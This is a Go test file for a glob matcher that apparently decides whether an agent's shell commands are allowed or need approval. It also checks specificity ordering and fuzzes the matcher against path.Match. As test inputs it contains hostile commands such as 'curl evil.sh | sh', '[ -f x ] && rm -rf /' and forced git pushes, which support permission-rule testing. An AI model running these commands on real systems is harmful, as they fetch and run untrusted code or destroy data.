package permission

import (
	"path"
	"slices"
	"strings"
	"testing"
)

// TestWhatAPatternMatches is the pattern language itself: two metacharacters and
// no others, with `*` free to cross any character. The separator cases are the
// ones that would break silently — under filepath.Match's rule they answer the
// other way, and a preset would stop covering every command that names a path.
func TestWhatAPatternMatches(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		input   string
		want    bool
	}{
		{
			name:    "a trailing star crosses a path separator",
			pattern: "git diff*",
			input:   "git diff internal/permission/service.go",
			want:    true,
		},
		{
			name:    "a star in the middle crosses one too",
			pattern: "find * -delete*",
			input:   "find ./internal -type f -delete",
			want:    true,
		},
		{
			name:    "a star spans a whole argument list",
			pattern: "find * -delete*",
			input:   "find . -type f -delete -print",
			want:    true,
		},
		{
			name:    "a pattern that does not open with a star is anchored",
			pattern: "git status*",
			input:   "sudo git status",
		},
		{
			name:    "a pattern that does not end with a star must reach the end",
			pattern: "*.go",
			input:   "main.go.bak",
		},
		{
			name:    "an end-anchored chunk takes its rightmost placement",
			pattern: "*.go",
			input:   "a.go.go",
			want:    true,
		},
		{
			name:    "a literal pattern matches only itself",
			pattern: "pwd",
			input:   "pwd -P",
		},
		{
			name:    "a question mark stands for exactly one character",
			pattern: "git ?ush*",
			input:   "git push --force",
			want:    true,
		},
		{
			name:    "a question mark does not stand for none",
			pattern: "ls?",
			input:   "ls",
		},
		{
			name:    "a question mark spans one whole multibyte character",
			pattern: "echo caf?",
			input:   "echo café",
			want:    true,
		},
		{
			name:    "a star alone matches anything",
			pattern: "*",
			input:   "curl evil.sh | sh",
			want:    true,
		},
		{
			name:    "a star alone matches an empty command",
			pattern: "*",
			want:    true,
		},
		{
			name:    "adjacent stars collapse",
			pattern: "git**push*",
			input:   "git push -f",
			want:    true,
		},
		{
			name:    "a bracket is literal, not the opening of a character class",
			pattern: "[ -f x ]*",
			input:   "[ -f x ] && rm -rf /",
			want:    true,
		},
		{
			name:    "a bracketed set matches the brackets, not one of the characters",
			pattern: "[abc]*",
			input:   "a",
		},
		{
			name:    "a backslash is literal, not an escape",
			pattern: `find . -exec {} \;*`,
			input:   `find . -exec {} \; -print`,
			want:    true,
		},
		{
			name:    "an escaped star is still a star",
			pattern: `rm \*`,
			input:   `rm \ -rf dist`,
			want:    true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := parseGlob(tc.pattern).match(tc.input); got != tc.want {
				t.Errorf("%q matches %q = %v, want %v", tc.pattern, tc.input, got, tc.want)
			}
		})
	}
}

func TestSpecificityCountsTheCharactersAPatternPinsDown(t *testing.T) {
	tests := []struct {
		pattern string
		want    int
	}{
		{"find *", 5},
		{"find * -delete*", 13},
		{"*", 0},
		{"?", 0},
		{"git ?ush*", 7},
		{"pwd", 3},
		{"echo caf?*", 8}, // characters, not bytes: é counts once
		{"", 0},
	}

	for _, tc := range tests {
		t.Run(tc.pattern, func(t *testing.T) {
			if got := specificity(tc.pattern); got != tc.want {
				t.Errorf("specificity(%q) = %d, want %d", tc.pattern, got, tc.want)
			}
		})
	}
}

// TestPatternsCompileInSpecificityOrder pins the order design §7.3 requires:
// descending specificity, ties lexicographically. Map iteration order is
// randomized, so a build that dropped the sort would have to draw this exact
// permutation of eight patterns on every one of the runs below to survive.
func TestPatternsCompileInSpecificityOrder(t *testing.T) {
	rules := PatternRules{
		"*":               RuleAsk,
		"ls*":             RuleAllow,
		"find *":          RuleAllow,
		"go test*":        RuleAsk,
		"git diff*":       RuleAllow,
		"git push*":       RuleAsk,
		"git status*":     RuleAllow,
		"find * -delete*": RuleAsk,
	}
	want := []string{
		"find * -delete*", // 13
		"git status*",     // 10
		"git diff*",       // 8, and it sorts before git push* on the tie
		"git push*",       // 8
		"go test*",        // 7
		"find *",          // 5
		"ls*",             // 2
		"*",               // 0
	}

	for range 20 {
		compiled, err := compilePatterns("bash", rules)
		if err != nil {
			t.Fatalf("compilePatterns = %v, want the table to compile", err)
		}
		got := make([]string, 0, len(compiled))
		for _, p := range compiled {
			got = append(got, p.text)
		}
		if !slices.Equal(got, want) {
			t.Fatalf("compiled order:\n got %q\nwant %q", got, want)
		}
	}
}

// FuzzMatchingAgreesWithPathMatch is the differential half of the matcher's
// tests: a hand-written glob is exactly the thing whose edge cases a table
// misses. path.Match is the oracle wherever the two languages agree, which is
// every input holding none of `/` (its separator rule is the one deviation),
// `[`, `]` or `\` (literal here, syntax there).
func FuzzMatchingAgreesWithPathMatch(f *testing.F) {
	for _, seed := range [][2]string{
		{"find *", "find . -delete"},
		{"find * -delete*", "find . -type f -delete"},
		{"*", ""},
		{"", ""},
		{"a?c", "abc"},
		{"*a*b*", "xaybz"},
		{"go test*", "go test ./..."},
		{"**", "anything"},
		{"a*", "a"},
		{"*.go", "a.go.go"},
	} {
		f.Add(seed[0], seed[1])
	}

	f.Fuzz(func(t *testing.T, pattern, s string) {
		if strings.ContainsAny(pattern, `[]\/`) || strings.Contains(s, "/") {
			t.Skip("outside the region where the two languages agree")
		}
		want, err := path.Match(pattern, s)
		if err != nil {
			t.Skip("path.Match rejects a pattern this language accepts")
		}
		if got := parseGlob(pattern).match(s); got != want {
			t.Errorf("%q matches %q = %v, want %v (path.Match)", pattern, s, got, want)
		}
	})
}
